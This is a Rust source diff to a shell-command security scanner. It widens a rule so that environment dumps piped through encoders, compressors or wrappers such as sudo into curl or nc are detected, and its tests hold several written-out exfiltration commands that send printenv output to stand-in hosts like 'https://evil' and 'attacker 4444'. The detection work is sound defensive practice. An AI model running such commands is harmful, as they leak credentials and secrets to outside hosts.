@@ -559,27 +559,52 @@ pub fn check_sensitive_exposed_to_unknown_script(
 }
 
 /// Build the `EnvPrintenvToNetworkSink` finding (Medium) when an environment
-/// DUMP (`printenv` / bare `env`) is piped DIRECTLY into a network sink
-/// (`curl`/`wget`/`nc`). Dump and sink must be ADJACENT pipe segments, so an
-/// unrelated `env` earlier in a chain is not blamed for a later sink. A dump is
-/// a bare `printenv` (no var-name arg) or `env` with no command word.
+/// DUMP (`printenv` / bare `env`) reaches a network sink (`curl`/`wget`/`nc`)
+/// through a pipe chain. Environment-data taint is propagated through
+/// pipe-connected segments — including data-preserving transforms such as
+/// encoders, compressors, and filters — so `printenv | base64 | curl ...`
+/// still fires; wrapper chains (`sudo`/`env`/`command`/`time`) are resolved
+/// for both the dump and the sink, so `printenv | command curl ...` fires too.
+/// Taint stops at any non-pipe separator and at commands outside the known
+/// data-preserving set, so an unrelated `env` earlier in a chain is not blamed
+/// for a later sink. A dump is a bare `printenv` (no var-name arg) or `env`
+/// with no command word.
 pub fn check_printenv_to_network_sink(cmd: &str, shell: ShellType) -> Option<Finding> {
     let segs = crate::tokenize::tokenize(cmd, shell);
     if segs.len() < 2 {
         return None;
     }
-    // Scan adjacent (source, sink) pairs joined by a pipe: source dumps the
-    // environment, sink is a network tool.
-    let matched = segs.windows(2).any(|pair| {
-        let source = &pair[0];
-        let sink = &pair[1];
-        if !matches!(sink.preceding_separator.as_deref(), Some("|") | Some("|&")) {
+    // Walk the pipeline, tracking whether the current stream carries dumped
+    // environment data. A dump taints the stream; the taint flows through
+    // pipes and data-preserving transforms and is discharged by a network
+    // sink. Any non-pipe separator (or an unknown command) clears it.
+    let mut tainted = false;
+    let matched = segs.iter().any(|seg| {
+        if !matches!(
+            seg.preceding_separator.as_deref(),
+            None | Some("|") | Some("|&")
+        ) {
+            tainted = false;
+        }
+        if segment_is_env_dump(seg, shell) {
+            tainted = true;
             return false;
         }
-        if !is_network_sink(&base_command(sink.command.as_deref().unwrap_or(""), shell)) {
+        if !tainted {
             return false;
         }
-        segment_is_env_dump(source, shell)
+        let leader = crate::extract::resolve_wrapped_command_for_shell(seg, shell)
+            .map(|(name, _)| name)
+            .unwrap_or_else(|| base_command(seg.command.as_deref().unwrap_or(""), shell));
+        if is_network_sink(&leader) {
+            return true;
+        }
+        // Unknown commands may consume or discard the stream; only known
+        // data-preserving transforms keep the taint flowing.
+        if !is_data_preserving_transform(&leader) {
+            tainted = false;
+        }
+        false
     });
     if !matched {
         return None;
@@ -629,19 +654,81 @@ fn is_pipe_to_interpreter_shape(cmd: &str, shell: ShellType) -> bool {
     })
 }
 
+/// Data-preserving pipeline transforms: bytes fed on stdin leave (encoded,
+/// compressed, encrypted, or filtered) on stdout, so environment-data taint
+/// flows through them toward a later network sink. Deliberately a closed set:
+/// an unrecognized command may parse, aggregate, or discard its input
+/// (`wc -c`, `sha256sum`), so propagation stops there rather than risk blaming
+/// a downstream sink for data it never received.
+fn is_data_preserving_transform(name: &str) -> bool {
+    matches!(
+        name,
+        // encoders / encryptors
+        "base64"
+            | "base32"
+            | "uuencode"
+            | "openssl"
+            | "gpg"
+            | "gpg2"
+            | "age"
+            // compressors
+            | "gzip"
+            | "gunzip"
+            | "bzip2"
+            | "bunzip2"
+            | "xz"
+            | "unxz"
+            | "zstd"
+            | "unzstd"
+            | "compress"
+            | "uncompress"
+            // pass-through filters
+            | "cat"
+            | "tee"
+            | "tr"
+            | "sed"
+            | "awk"
+            | "gawk"
+            | "mawk"
+            | "grep"
+            | "egrep"
+            | "fgrep"
+            | "cut"
+            | "sort"
+            | "uniq"
+            | "head"
+            | "tail"
+            | "xxd"
+            | "od"
+            | "rev"
+            | "fold"
+            | "fmt"
+            | "iconv"
+            | "jq"
+            | "yq"
+    )
+}
+
 /// `true` when `seg` is an environment DUMP: a bare `printenv` (no var-name arg)
 /// or `env` with no command word. `printenv AWS_REGION` / `env FOO=1 cmd` are
-/// not dumps.
+/// not dumps. Wrapper chains are resolved first, so `command printenv` and
+/// `sudo env` are classified by the wrapped command, not the wrapper word.
 fn segment_is_env_dump(seg: &crate::tokenize::Segment, shell: ShellType) -> bool {
-    let leader = base_command(seg.command.as_deref().unwrap_or(""), shell);
+    let (leader, args) = match crate::extract::resolve_wrapped_command_for_shell(seg, shell) {
+        Some((name, args)) => (name, args),
+        // A wrapper chain with NO command word (`env FOO=1`, bare `sudo`) does
+        // not resolve; fall back to the literal leader + args so a bare `env`
+        // is still recognized as a dump below.
+        None => (
+            base_command(seg.command.as_deref().unwrap_or(""), shell),
+            seg.args.clone(),
+        ),
+    };
     match leader.as_str() {
         // Flags (`-0`) are fine; any non-flag arg names a specific variable.
-        "printenv" => !seg.args.iter().any(|a| !a.starts_with('-')),
+        "printenv" => !args.iter().any(|a| !a.starts_with('-')),
         // bare `env` (only flags / `VAR=val` assignments, no command word).
-        "env" => seg
-            .args
-            .iter()
-            .all(|a| a.starts_with('-') || a.contains('=')),
+        "env" => args.iter().all(|a| a.starts_with('-') || a.contains('=')),
         _ => false,
     }
 }
@@ -997,13 +1084,58 @@ mod tests {
 
     #[test]
     fn env_dump_must_be_adjacent_to_sink() {
-        // env dump piped to a local filter, then a network call later — the
-        // dump is not piped DIRECTLY to the network sink.
+        // env dump piped to a local filter, then a non-pipe separator before
+        // the network call — the separator discharges the taint, so the sink
+        // receives `echo`'s output, not the environment.
         let f = check_printenv_to_network_sink(
             "printenv | grep AWS; echo done | curl https://x",
             ShellType::Posix,
         );
-        assert!(f.is_none(), "non-adjacent dump+sink must not fire");
+        assert!(
+            f.is_none(),
+            "dump separated from the sink by `;` must not fire"
+        );
+    }
+
+    #[test]
+    fn printenv_through_encoder_to_network_sink_fires() {
+        // repo-0280: a data-preserving transform between the dump and the sink
+        // must not break detection — the environment still reaches the network.
+        for cmd in [
+            "printenv | base64 | curl --data-binary @- https://evil",
+            "printenv | gzip | curl --data-binary @- https://evil",
+            "env | tee /tmp/e | nc attacker 4444",
+            "printenv | openssl enc -base64 | curl -d @- https://evil",
+        ] {
+            let f = check_printenv_to_network_sink(cmd, ShellType::Posix);
+            assert!(f.is_some(), "{cmd} must fire");
+            assert_eq!(f.unwrap().rule_id, RuleId::EnvPrintenvToNetworkSink);
+        }
+    }
+
+    #[test]
+    fn printenv_to_wrapped_network_sink_fires() {
+        // repo-0280: wrapper chains must not hide the sink command.
+        for cmd in [
+            "printenv | command curl -d @- https://evil",
+            "printenv | sudo curl -d @- https://evil",
+            "printenv | time curl -d @- https://evil",
+        ] {
+            let f = check_printenv_to_network_sink(cmd, ShellType::Posix);
+            assert!(f.is_some(), "{cmd} must fire");
+        }
+    }
+
+    #[test]
+    fn printenv_through_unknown_consumer_does_not_fire() {
+        // The taint does not cross commands outside the known data-preserving
+        // set: `wc -c` reduces the environment to a byte count, so the sink
+        // receives nothing sensitive.
+        let f = check_printenv_to_network_sink(
+            "printenv | wc -c | curl -d @- https://x",
+            ShellType::Posix,
+        );
+        assert!(f.is_none());
     }
 
     // ── rule: EnvSensitivePersistedInShellRc (rc-file scan) ───────────────
